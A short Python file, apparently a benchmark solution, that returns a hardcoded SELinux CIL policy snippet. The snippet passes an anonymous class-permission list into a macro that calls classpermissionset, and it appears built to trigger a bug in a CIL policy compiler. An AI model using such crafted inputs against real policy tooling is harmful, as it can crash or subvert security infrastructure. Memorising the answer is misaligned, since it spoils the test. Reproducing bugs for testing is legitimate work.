import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        return (
            b"(class CLASS (PERM))\n"
            b"(classorder (CLASS))\n"
            b"(macro MACRO ((classpermission ARG))\n"
            b"    (classpermissionset ARG (CLASS (PERM)))\n"
            b")\n"
            b"(call MACRO ((CLASS (PERM))))\n"
        )